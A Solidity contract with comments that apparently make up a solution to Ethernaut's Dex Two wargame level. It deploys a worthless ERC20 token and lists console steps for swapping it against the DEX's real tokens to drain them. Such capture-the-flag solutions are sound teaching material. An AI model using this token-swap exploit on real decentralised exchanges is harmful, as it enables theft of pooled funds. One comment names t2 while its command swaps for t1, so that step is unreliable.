// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract SinfulToken is ERC20 {
    constructor (uint256 _totalSupply) ERC20("SinfulToken", "SFTK") {
        // Execute the _mint function on ERC contract
        ERC20._mint(msg.sender, _totalSupply);
    }
    /*------IN CONSOLE---------
    - We swap 100 sinful tokens for 100 t1 tokens 
        await contract.swap(sinful, t1, "100")
        
    - We swap 200 sinful tokens for 100 t2 tokens 
        await contract.swap(sinful, t1, "200")

    -------IN REMIX----------
    - We deploy the attack contract (this one) with a token supply of 400.
    - We transfer 100 SinfulTokens to DEX for mainting 1:1 ratio of tokens on Dex.
    - We approve 300 tokens for Ethernaut's Dex Two contract address to be able to swap them.
    */
}
